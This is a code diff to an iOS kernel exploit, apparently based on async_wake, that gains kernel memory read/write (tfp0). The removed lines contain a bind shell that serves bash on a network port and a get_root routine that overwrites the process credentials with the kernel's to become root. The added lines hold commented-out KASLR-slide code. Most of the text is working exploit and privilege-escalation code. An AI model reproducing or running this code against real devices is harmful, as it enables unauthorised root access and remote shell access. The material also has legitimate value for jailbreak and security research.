@@ -2,13 +2,15 @@
 #include <stdlib.h>
 #include <string.h>
 #include <unistd.h>
+#import <sys/mount.h>
+#import <spawn.h>
+#import <copyfile.h>
+#import <mach-o/dyld.h>
+#import <sys/types.h>
+#import <sys/stat.h>
+#import <sys/utsname.h>
 
 #include <mach/mach.h>
-#include <netinet/in.h>
-#include <spawn.h>
-#include <dirent.h>
-#include <sys/stat.h>
-#include <sys/utsname.h>
 
 #include <pthread.h>
 
@@ -164,7 +166,8 @@ void prepare_user_client() {
     printf(" [-] unable to get user client connection\n");
     exit(EXIT_FAILURE);
   }
-  
+	
+	
   printf("got user client: 0x%x\n", user_client);
 }
 
@@ -473,8 +476,11 @@ mach_port_t get_kernel_memory_rw() {
   uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;
   
   printf("message size for kalloc.4096: %d\n", message_size_for_kalloc_size(4096));
-  
+	
+	// Creates a user client
   prepare_user_client();
+	
+	
   
   uint64_t task_self = task_self_addr();
   if (task_self == 0) {
@@ -678,7 +684,28 @@ mach_port_t get_kernel_memory_rw() {
   uint64_t task_addr = rk64(task_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
   uint64_t itk_space = rk64(task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SPACE));
   uint64_t is_table = rk64(itk_space + koffset(KSTRUCT_OFFSET_IPC_SPACE_IS_TABLE));
-  
+	
+	
+//	mach_ports_register(mach_task_self(), &user_client, 1);
+//	uint64_t IOSurfaceRootUserClient_port = rk64(task_addr + 0x2e8 + 0x8);
+//	uint64_t IOSurfaceRootUserClient_addr = rk64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
+//	uint64_t IOSurfaceRootUserClient_vtab = rk64(IOSurfaceRootUserClient_addr);
+//
+//	printf("IOSurfaceRootUserClient_vtab: %016llx\n", IOSurfaceRootUserClient_vtab);
+//	printf("IOSurfaceRootUserClient_vtab[0]: %016llx\n", rk64(IOSurfaceRootUserClient_vtab));
+//	printf("starting assembly of IOSurfaceRootUserClient_vtab[0]: %016llx\n", rk64(rk64(IOSurfaceRootUserClient_vtab)));
+//
+//// Use IDA to find the first occurance of the sequence of bytes from "starting assembly..." (on 6+ it is a9bf7bfd14000fe3 for IDA)
+//// If you don't have IDA, use a hex editor to find the offset of "e30f0014fd7bbfa9", then use `joker -a <offset> kernel`, and use the address returned as the value (again, not sure if asm is the same)
+//#define FIRST_VTAB_LOCATION 0xfffffff0065e19e4
+//
+//	uint64_t slide = rk64(IOSurfaceRootUserClient_vtab)-FIRST_VTAB_LOCATION;
+//	printf("slide is maybe %016llx\n", slide);
+//	printf("ooh? %08x\n", rk32(slide + 0xFFFFFFF007004000));
+//
+//	printf("ooh? %s\n", (char*)rk64(slide + 0xFFFFFFF00758C000));
+	
+	
   uint32_t port_index = first_port >> 8;
   const int sizeof_ipc_entry_t = 0x18;
   
@@ -693,273 +720,17 @@ mach_port_t get_kernel_memory_rw() {
   return safer_tfp0;
 }
 
-char* bundle_path() {
-    CFBundleRef mainBundle = CFBundleGetMainBundle();
-    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
-    int len = 4096;
-    char* path = malloc(len);
-    
-    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
-    
-    return path;
-}
+kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
 
-char* prepare_directory(char* dir_path) {
-    DIR *dp;
-    struct dirent *ep;
-    
-    char* in_path = NULL;
-    char* bundle_root = bundle_path();
-    asprintf(&in_path, "%s/iosbinpack64/%s", bundle_root, dir_path);
-    
-    
-    dp = opendir(in_path);
-    if (dp == NULL) {
-        printf("unable to open payload directory: %s\n", in_path);
-        return NULL;
-    }
-    
-    while ((ep = readdir(dp))) {
-        char* entry = ep->d_name;
-        char* full_entry_path = NULL;
-        asprintf(&full_entry_path, "%s/iosbinpack64/%s/%s", bundle_root, dir_path, entry);
-        
-        printf("preparing: %s\n", full_entry_path);
-        
-        // make that executable:
-        int chmod_err = chmod(full_entry_path, 0777);
-        if (chmod_err != 0){
-            perror("chmod failed");
-        }
-        
-        free(full_entry_path);
-    }
-    
-    closedir(dp);
-    free(bundle_root);
-    
-    return in_path;
-}
-
-// prepare all the payload binaries under the iosbinpack64 directory
-// and build up the PATH
-char* prepare_payload() {
-    char* path = calloc(4096, 1);
-    strcpy(path, "PATH=");
-    char* dir;
-    dir = prepare_directory("bin");
-    strcat(path, dir);
-    strcat(path, ":");
-    free(dir);
-    
-    dir = prepare_directory("sbin");
-    strcat(path, dir);
-    strcat(path, ":");
-    free(dir);
-    
-    dir = prepare_directory("usr/bin");
-    strcat(path, dir);
-    strcat(path, ":");
-    free(dir);
-    
-    dir = prepare_directory("usr/local/bin");
-    strcat(path, dir);
-    strcat(path, ":");
-    free(dir);
-    
-    dir = prepare_directory("usr/sbin");
-    strcat(path, dir);
-    strcat(path, ":");
-    free(dir);
-    
-    strcat(path, "/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec");
-    
-    return path;
-}
-
-void bind_shell(char* env_path, int port) {
-    
-    char* env = env_path;
-    char* bundle_root = bundle_path();
-    
-    char* shell_path = NULL;
-    asprintf(&shell_path, "%s/iosbinpack64/bin/bash", bundle_root);
-    
-    char* argv[] = {shell_path, NULL};
-    char* envp[] = {env, NULL};
-    
-    struct sockaddr_in sa;
-    sa.sin_len = 0;
-    sa.sin_family = AF_INET;
-    sa.sin_port = htons(port);
-    sa.sin_addr.s_addr = INADDR_ANY;
-    int sock = socket(PF_INET, SOCK_STREAM, 0);
-    bind(sock, (struct sockaddr*)&sa, sizeof(sa));
-    listen(sock, 1);
-    printf("shell listening on port %d\n", port);
-    
-    for(;;) {
-        int conn = accept(sock, 0, 0);
-        
-        posix_spawn_file_actions_t actions;
-        
-        posix_spawn_file_actions_init(&actions);
-        posix_spawn_file_actions_adddup2(&actions, conn, 0);
-        posix_spawn_file_actions_adddup2(&actions, conn, 1);
-        posix_spawn_file_actions_adddup2(&actions, conn, 2);
-        
-        
-        pid_t spawned_pid = 0;
-        //uid_t old = get_root(rk64(kt + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO)));
-        int spawn_err = posix_spawn(&spawned_pid, shell_path, &actions, NULL, argv, envp);
-        //setuid(old);
-        if (spawn_err != 0){
-            perror("shell spawn error");
-        } else {
-            printf("shell posix_spawn success!\n");
-        }
-        
-        posix_spawn_file_actions_destroy(&actions);
-        
-        printf("our pid: %d\n", getpid());
-        printf("spawned_pid: %d\n", spawned_pid);
-        
-        int wl = 0;
-        while (waitpid(spawned_pid, &wl, 0) == -1 && errno == EINTR);
-    }
-    
-    free(shell_path);
-}
-
-// thx ianbeer for async_wake
-// proc_for_pid based on cheesecakeufo code
-// by stek29: https://gist.github.com/stek29/8b808986e7ee3c204bfb76d69577812f
-
-uint64_t proc_for_pid(uint32_t pid) {
-    uint64_t task_self = task_self_addr();
-    uint64_t struct_task = rk64(task_self + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
-    uint64_t next_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
-    
-    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
-        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-        uint32_t found = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
-        
-        if (found == pid) {
-            return bsd_info;
-        }
-        
-        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));
-    }
-    
-    struct_task = next_task;
-    while (struct_task != 0 && ((struct_task & 0xffff000000000000) == 0xffff000000000000) ) {
-        uint64_t bsd_info = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
-        uint32_t found = rk32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));
-        
-        if (found == pid) {
-            return bsd_info;
-        }
-        
-        struct_task = rk64(struct_task + koffset(KSTRUCT_OFFSET_TASK_NEXT));
-    }
-    
-    return -1;
-}
-
-
-uid_t get_root () {
-    
-    uid_t old = getuid();
-    
-    uint64_t our_proc = proc_for_pid(getpid());
-    printf("our proc: %llx\n", our_proc);
-    uint64_t kernel_proc = proc_for_pid(0);
-    printf("krn proc: %llx\n", kernel_proc);
-    
-    if(our_proc == -1 || kernel_proc == -1) {
-        printf("[ERROR]: no our/krn proc. wut\n");
-        return getuid();
-    }
-    
-    uint64_t krn_ucred = rk64(kernel_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    printf("krn_ucred: %llx\n", krn_ucred);
-    uint64_t our_ucred = rk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */);
-    printf("our_ucred: %llx\n", our_ucred);
-    
-    wk64(our_proc + 0x100 /* KSTRUCT_OFFSET_PROC_UCRED */, krn_ucred);
-    printf("[INFO]: successfully wrote our kern_ucred into our cred!\n");
-    setuid(0);
-    printf("[INFO]: new uid: %d\n", getuid());
-    FILE *f = fopen("/var/mobile/test.txt", "w");
-    if(f == 0){
-        printf("[INFO]: failed to write test file");
-    }else{
-        printf("[INFO]: wrote test file: %p\n", f);
-    }
-    
-    return old;
-}
-
-mach_port_t go() {
+mach_port_t get_tfp0(mach_port_t*uc) {
   mach_port_t tfp0 = get_kernel_memory_rw();
   printf("tfp0: %x\n", tfp0);
-    
-    /**
-     
-     We can now temporarily gain uid=0! I think we have to swap back to the old uid to prevent kernel panics though.
-     
-     Usage:
-     - call get_root() and store the uid it returns.
-     - do root stuff
-     - setuid(old_uid)
-     
-     */
-
-    uid_t old = get_root();
-    // do root stuff below
-    
-    
-    
-    /*
-     To change your resolution:
-     - Edit values in the .plist
-     - Change the boolean below to true
-     - Reboot
-     
-     You only have to do this once. BE CAREFUL, IT IS NOT MY FAULT IF YOU FUCK THIS UP
-     */
-    bool shouldChangeResolution = false;
-
-    if(shouldChangeResolution){
-        
-        char ch;
-        FILE *source, *target;
-        
-        char* path;
-        
-        asprintf(&path, "%s/com.apple.iokit.IOMobileGraphicsFamily.plist", bundle_path());
-        
-        source = fopen(path, "r");
-        
-        target = fopen("/var/mobile/Library/Preferences/com.apple.iokit.IOMobileGraphicsFamily.plist", "w");
-        
-        while( ( ch = fgetc(source) ) != EOF )
-            fputc(ch, target);
-        
-        printf("Resolution changed, please reboot.\n");
-        
-        fclose(source);
-        fclose(target);
-        
-    }
-
-    //set uid back
-    setuid(old);
-    
-    if (probably_have_correct_symbols()) {
-        printf("have symbols for this device, testing the kernel debugger...\n");
-        test_kdbg();
-    }
-    
-    return tfp0;
+	
+	*uc = user_client;
+  
+  if (probably_have_correct_symbols()) {
+    printf("have symbols for this device, testing the kernel debugger...\n");
+    test_kdbg();
+  }
+  return tfp0;
 }
